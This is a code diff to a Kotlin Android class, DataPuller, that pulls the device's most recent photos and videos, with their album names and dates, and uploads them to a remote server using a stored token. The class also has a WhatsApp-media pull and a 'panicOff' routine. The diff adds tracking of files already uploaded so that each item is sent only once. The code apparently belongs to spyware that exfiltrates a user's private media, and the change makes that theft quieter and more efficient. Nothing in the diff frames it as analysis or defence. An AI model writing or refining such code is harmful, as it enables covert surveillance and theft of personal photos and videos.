@@ -19,6 +19,8 @@ import java.io.File
 import java.io.FileOutputStream
 
 private const val TAG = "DataPuller"
+private const val PREFS_NAME = "dilarion_uploaded_media"
+private const val KEY_MEDIA_IDS = "uploaded_ids"
 
 class DataPuller(
     private val context: Context,
@@ -140,8 +142,11 @@ class DataPuller(
         val token = getToken() ?: return
         val tmpDir = context.cacheDir
         var uploaded = 0
+        var skipped = 0
+        val uploadedIds = getUploadedMediaIds()
+        val newlyUploaded = mutableListOf<String>()
 
-        // Images — 50 most recent
+        // Images — 50 most recent, skip already uploaded
         val imgCols = arrayOf(
             MediaStore.Images.Media._ID,
             MediaStore.Images.Media.DISPLAY_NAME,
@@ -155,6 +160,8 @@ class DataPuller(
             var count = 0
             while (cursor.moveToNext() && count < 50) {
                 val id    = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
+                val mediaKey = "img_$id"
+                if (uploadedIds.contains(mediaKey)) { skipped++; count++; continue }
                 val name  = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)) ?: "img_$id.jpg"
                 val album = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)) ?: ""
                 val date  = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
@@ -172,6 +179,7 @@ class DataPuller(
                             album.toRequestBody("text/plain".toMediaType()),
                             date.toString().toRequestBody("text/plain".toMediaType()),
                         )
+                        newlyUploaded.add(mediaKey)
                         uploaded++
                     }
                 }.onFailure { Log.e(TAG, "image upload failed: $it") }
@@ -180,7 +188,7 @@ class DataPuller(
             }
         }
 
-        // Videos — 10 most recent, skip >50MB
+        // Videos — 10 most recent, skip >50MB, skip already uploaded
         val vidCols = arrayOf(
             MediaStore.Video.Media._ID,
             MediaStore.Video.Media.DISPLAY_NAME,
@@ -195,12 +203,14 @@ class DataPuller(
             var count = 0
             while (cursor.moveToNext() && count < 10) {
                 val id    = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID))
+                val mediaKey = "vid_$id"
+                count++
+                if (uploadedIds.contains(mediaKey)) { skipped++; continue }
+                val size  = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE))
+                if (size > 50 * 1024 * 1024) continue
                 val name  = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)) ?: "vid_$id.mp4"
                 val album = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.BUCKET_DISPLAY_NAME)) ?: ""
                 val date  = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_ADDED))
-                val size  = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE))
-                count++
-                if (size > 50 * 1024 * 1024) continue
                 val uri = Uri.withAppendedPath(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id.toString())
                 val tmp = File(tmpDir, "pull_vid_$id.mp4")
                 runCatching {
@@ -215,13 +225,16 @@ class DataPuller(
                             album.toRequestBody("text/plain".toMediaType()),
                             date.toString().toRequestBody("text/plain".toMediaType()),
                         )
+                        newlyUploaded.add(mediaKey)
                         uploaded++
                     }
                 }.onFailure { Log.e(TAG, "video upload failed: $it") }
                 tmp.delete()
             }
         }
-        Log.i(TAG, "pullMedia: $uploaded files uploaded")
+
+        if (newlyUploaded.isNotEmpty()) markMediaUploaded(*newlyUploaded.toTypedArray())
+        Log.i(TAG, "pullMedia: $uploaded new uploaded, $skipped skipped (already sent)")
     }
 
     suspend fun pullWhatsappMedia() {
@@ -277,5 +290,19 @@ class DataPuller(
 
     fun panicOff() {
         Log.i(TAG, "panicOff")
+    }
+
+    private fun getUploadedMediaIds(): MutableSet<String> {
+        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        return prefs.getStringSet(KEY_MEDIA_IDS, emptySet())?.toMutableSet() ?: mutableSetOf()
+    }
+
+    private fun markMediaUploaded(vararg ids: String) {
+        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        val set = getUploadedMediaIds()
+        set.addAll(ids)
+        // Cap at 5000 entries so prefs don't grow unbounded
+        val capped = if (set.size > 5000) set.drop(set.size - 5000).toMutableSet() else set
+        prefs.edit().putStringSet(KEY_MEDIA_IDS, capped).apply()
     }
 }
